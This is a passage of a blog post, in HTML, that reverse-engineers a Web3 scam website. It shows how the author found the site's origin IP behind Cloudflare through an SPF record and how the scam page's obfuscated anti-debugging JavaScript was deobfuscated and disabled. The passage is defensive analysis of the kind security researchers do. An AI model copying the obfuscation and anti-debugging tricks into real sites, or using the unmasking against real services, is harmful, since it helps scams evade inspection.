@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Ching367436,臺中一中電腦資訊研習社 38th 副社長,Bamboofox 社長,書卷獎,資安,AIS3 最佳專題">
+    
+    <meta name="author" content="Ching367436">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://blog.ching367436.me/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="When I was creating a Web3 challenge for AIS3 Pre-exam 2024, I referenced a scam website that had been sent to my wallet before. I wanted to implement a sleek Web3 wallet connect interface, but I disc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation">
+<meta property="og:url" content="https://blog.ching367436.me/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/">
+<meta property="og:site_name" content="Ching367436">
+<meta property="og:description" content="When I was creating a Web3 challenge for AIS3 Pre-exam 2024, I referenced a scam website that had been sent to my wallet before. I wanted to implement a sleek Web3 wallet connect interface, but I disc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.ching367436.me/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/cover.webp">
+<meta property="article:published_time" content="2024-08-31T13:44:30.000Z">
+<meta property="article:author" content="Ching367436">
+<meta property="article:tag" content="deobfuscation">
+<meta property="article:tag" content="web3">
+<meta property="article:tag" content="dynamic-analysis">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.ching367436.me/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/cover.webp">
+    
+    
+        <!-- Google tag (gtag.js) -->
+        <script src="https://www.googletagmanager.com/gtag/js?id=G-PRRP5V9HFQ"></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-PRRP5V9HFQ');
+        </script>
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation -
+        
+        Ching367436&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <meta http-equiv="Content-Security-Policy" content="
+  default-src 'self' https://*.clarity.ms https://c.bing.com https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com https://giscus.app/ https://cdn.jsdelivr.net/ https://fonts.googleapis.com https://fonts.gstatic.com https://cloudflareinsights.com ; 
+  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.clarity.ms https://c.bing.com https://*.googletagmanager.com https://giscus.app/ https://cdn.jsdelivr.net/ https://static.cloudflareinsights.com ; 
+  style-src 'unsafe-inline' 'self' https://giscus.app/ https://cdn.jsdelivr.net/ https://fonts.googleapis.com https://fonts.gstatic.com; 
+  img-src 'self' data: https://*.clarity.ms https://c.bing.com https://cdn.jsdelivr.net/ https://www.googletagmanager.com ;
+" />
+
+                
+    
+            
+                
+                    <script data-swup-reload-script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "gh62bmw6cl"); </script>
+                
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap" rel="stylesheet">
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"blog.ching367436.me","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"18px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["竹狐隊長"]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"github-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":false,"recommendation":{"enable":true,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans TC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap"},"english":{"enable":true,"family":"Lexend","url":"https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":true,"id":"G-PRRP5V9HFQ"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Ching367436's blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ching367436","instagram":null,"zhihu":null,"twitter":"https://twitter.com/Ching367436","email":"admin@ching367436.me","telegram":"https://t.me/Ching367436"},"qrs":[]}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"none","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/3/20 21:33:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style><link rel="alternate" href="/atom.xml" title="Ching367436" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Ching367436&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/cover.webp" alt="Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/Ching367436.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Ching367436</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">竹狐隊長</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-08-31 21:44:30</span>
+        <span class="mobile">2024-08-31 21:44:30</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/deobfuscation/">deobfuscation</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/web3/">web3</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/dynamic-analysis/">dynamic-analysis</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>18 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>When I was creating a Web3 challenge for AIS3 Pre-exam 2024, I referenced a scam website that had been sent to my wallet before. I wanted to learn how to implement a sleek Web3 wallet connect interface based on it, but I discovered that the website’s code was heavily obfuscated and included anti-debugging mechanisms, making it difficult to use the debugger properly. So, I started investigating the website, and eventually, it became the content of the challenge I created.</p>
+<h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>A scam ERC20 token has appeared in my wallet, as shown in the image below. The link leads to a website that looks like a Blast2L site.</p>
+<img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/erc20.webp" alt="erc20" style="width: 45em;">
+
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/website.webp" alt="website"></p>
+<h2 id="Uncover-the-IP-hidden-behind-Cloudflare"><a href="#Uncover-the-IP-hidden-behind-Cloudflare" class="headerlink" title="Uncover the IP hidden behind Cloudflare"></a>Uncover the IP hidden behind Cloudflare</h2><p>The website is hidden behind Cloudflare, so I first attempted to discover its actual IP address. An SPF record for that domain includes an IP address, as shown below.</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v=spf1 ip4:79.137.xxx.xx a mx ~all</span><br></pre></td></tr></table></figure></div>
+
+<p>The IP address is from Russia. Furthermore, the website’s CSS contains domains from Russia, and even the code includes Russian characters. This suggests a potential association between the website and Russia. I discovered a list of scam websites hosted on that IP from Gist, indicating that the IP is highly suspicious.</p>
+<div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* [...] */</span>, <span class="selector-pseudo">:root</span> <span class="selector-tag">a</span><span class="selector-attr">[href*=<span class="string">"//top.mail.ru/jump?"</span>]</span>, <span class="selector-pseudo">:root</span> <span class="selector-tag">a</span><span class="selector-id">#mobtop</span><span class="selector-attr">[title^=<span class="string">"Рейтинг мобильных сайтов"</span>]</span>, <span class="comment">/* [...] */</span> {</span><br><span class="line">    <span class="attribute">display</span>: none <span class="meta">!important</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+<img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/ip-scam-list.webp" alt="ip-scam-list" style="width: 42em;">
+
+<p>If we directly visit the website, we will see a FASTPANEL page.</p>
+<img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/fastpanel.webp" alt="fastpanel" style="width: 38em;">
+
+<p>I modified the request host header to the original domain and sent the request again. The original website was displayed, confirming that the SPF IP is indeed the website’s IP.</p>
+<img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/modify-host-header.webp" alt="modify-host-header" style="width: 45em;">
+
+
+
+<h2 id="Handling-Anti-Debugging"><a href="#Handling-Anti-Debugging" class="headerlink" title="Handling Anti-Debugging"></a>Handling Anti-Debugging</h2><p>The website’s main script is heavily obfuscated and over 2 million characters long. Therefore, we need to use dynamic analysis to learn it quickly.</p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/main-script.webp" alt="main-script"></p>
+<h3 id="The-breakpoint-problem"><a href="#The-breakpoint-problem" class="headerlink" title="The breakpoint problem"></a>The breakpoint problem</h3><p>If we open the developer tools, we will be paused at a breakpoint. Resuming the execution will cause us to be paused again, so let’s try removing the breakpoint first. There are two functions in the call stack when paused; let’s investigate it.</p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/debugger-pause.webp" alt="debugger-pause"></p>
+<p>The code around the breakpoint is displayed below. It’s a conditional ternary operator with a constant condition (true), so the false condition code is essentially dead code.</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">''</span> + _0x3556f3[<span class="title function_">__p_0566375197</span>(<span class="number">8698</span>)](_0x50c3fc, _0x50c3fc))[_0x3556f3[<span class="title function_">__p_0566375197</span>(<span class="number">8699</span>)]] !== <span class="title function_">__p_1452585703_calc</span>(<span class="number">312</span>, __p_2651934416 = -<span class="number">22</span>) * <span class="title function_">__p_1452585703_calc</span>(<span class="number">10</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">22</span>)) + <span class="number">822</span> * <span class="number">11</span> + <span class="number">12161</span> * <span class="title function_">__p_1452585703_calc</span>(<span class="number">1</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">22</span>)) || _0x50c3fc % (<span class="number">8999</span> * <span class="title function_">__p_1452585703_calc</span>(<span class="number">1</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">22</span>)) + <span class="number">4019</span> + <span class="number">5e3</span>) === <span class="title function_">__p_1452585703_calc</span>(<span class="number">9611</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">22</span>)) + <span class="number">3453</span> + <span class="number">6158</span> </span><br><span class="line">    ? <span class="keyword">function</span>(<span class="params"></span>) { <span class="keyword">return</span> <span class="title function_">__p_1452585703_calc</span>(<span class="title function_">__p_1452585703_calc</span>([], __p_2651934416 = <span class="number">41</span>), __p_2651934416 = <span class="number">41</span>)}</span><br><span class="line">        [<span class="title function_">__p_1452585703_calc</span>(<span class="title function_">__p_0566375197</span>(<span class="number">8135</span>) + <span class="string">'\u0072\u0075\u0063\u0074\u006f'</span>, <span class="string">'\x72'</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">7</span>))](<span class="title function_">__p_1452585703_calc</span>(<span class="string">'\u0064\u0065\u0062\u0075'</span>, <span class="title function_">_0x1c7f46</span>(<span class="number">1470</span>), __p_2651934416 = -<span class="number">7</span>))[<span class="title function_">_0x59f630</span>(<span class="number">1874</span>)](<span class="title function_">__p_1452585703_calc</span>(<span class="title function_">__p_0566375197</span>(<span class="number">8706</span>), <span class="string">'\x6e'</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">7</span>))) </span><br><span class="line">        : <span class="keyword">function</span>(<span class="params"></span>) { <span class="keyword">return</span> <span class="title function_">__p_1452585703_calc</span>([], __p_2651934416 = <span class="number">41</span>) }[<span class="title function_">__p_1452585703_calc</span>(<span class="title function_">__p_0566375197</span>(<span class="number">8135</span>) + <span class="title function_">__p_0566375197</span>(<span class="number">8136</span>), <span class="string">'\u0072'</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">7</span>))](<span class="title function_">__p_1452585703_calc</span>(<span class="title function_">__p_0566375197</span>(<span class="number">8707</span>), __p_0566375197[<span class="string">'\x61\x70\x70\x6c\x79'</span>](<span class="literal">undefined</span>, [<span class="number">8708</span>]), <span class="title function_">__p_4879216376</span>(-<span class="number">7</span>)))[<span class="title function_">_0x59f630</span>(<span class="number">1801</span>)](<span class="title function_">__p_1452585703_calc</span>(<span class="title function_">__p_0566375197</span>(<span class="number">8709</span>) + <span class="title function_">__p_0566375197</span>(<span class="number">8710</span>), <span class="string">'\u0074'</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">7</span>)))</span><br></pre></td></tr></table></figure></div>
+
+<p>If we deobfuscate the code dynamically, we get the following code within the <code>0x2a8683</code> function. The code retrieves the function constructor from a function and uses it to create a new function with a <code>debugger</code> statement in its body. Then, it calls the function, triggering the breakpoint. Commenting out the code that calls <code>0x2a8683</code> solves the breakpoint problem.</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params"></span>) { <span class="keyword">return</span> <span class="literal">true</span> }[<span class="string">'constructor'</span>](<span class="string">'debugger'</span>)[<span class="string">'call'</span>](<span class="string">"action"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// It can be simplify to the following since `function() { return true }['constructor']` is just the function constructor.</span></span><br><span class="line"><span class="title class_">Fucntion</span>(<span class="string">'debugger'</span>)[<span class="string">'call'</span>](<span class="string">"action"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// It can be furthor simplified to the following, as the function does not use `this`, which is set to `"action"`</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>){ <span class="keyword">debugger</span> } )()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Disable-disable-devtool-js"><a href="#Disable-disable-devtool-js" class="headerlink" title="Disable disable-devtool.js"></a>Disable disable-devtool.js</h3><p>After removing the breakpoint, I reopened the dev tools, and the website closed itself, as shown below:</p>
+<p><video src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/disable-debugger.mp4" controls=""></video></p>
+<p>After inspecting the traffic, I found that the website loads the disable-devtool.js, the root cause of the website closing itself.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cdn.jsdelivr.net/npm/disable-devtool</span><br></pre></td></tr></table></figure></div>
+
+<p>When reading the disable-devtool.js document, I discovered that one needs to call the <code>DisableDevtool</code> function to initialize its functionality. So I searched for <code>DisableDevtool</code> in the script and found where it’s invoked. They forgot to obfuscate it!</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_0x476324[<span class="title function_">__p_1452585703_calc</span>(<span class="string">'\u0064\u0069\u0073\u0061\u0062'</span> + <span class="title function_">_0x32d8fd</span>(<span class="number">2334</span>) + <span class="string">'\u0076\u005f\u0074\u006f\u006f'</span>, <span class="string">'\u006c'</span>, __p_2651934416 = -<span class="number">7</span>)]) {</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">__p_1452585703_calc</span>(<span class="variable language_">window</span>[<span class="title function_">__p_1452585703_calc</span>(<span class="title function_">__p_0566375197</span>(<span class="number">7874</span>) + <span class="string">'\u006c\u0065\u0044\u0065\u0076'</span>, <span class="title function_">__p_0566375197</span>(<span class="number">7875</span>), __p_2651934416 = -<span class="number">7</span>)], __p_2651934416 = <span class="number">41</span>)) {</span><br><span class="line">        location[<span class="title function_">__p_1452585703_calc</span>(<span class="string">'\x72\x65\x6c\x6f\x61'</span>, <span class="string">'\u0064'</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">7</span>))]();</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    }</span><br><span class="line">    <span class="title class_">DisableDevtool</span>()</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>I deobfuscated the surrounding code dynamically and obtained the following code. First, it checks if <code>_0x476324["disable_dev_tool"]</code> is true in order to determine whether to enable disable-devtool.js. If it is true, it then verifies if <code>DisableDevtool</code> is loaded correctly. If not, it will be reloaded. Therefore, if we block the disable-devtool.js traffic, the web pages will reload infinitely. Commenting out <code>DisableDevtool</code> should disable disable-devtool.js.</p>
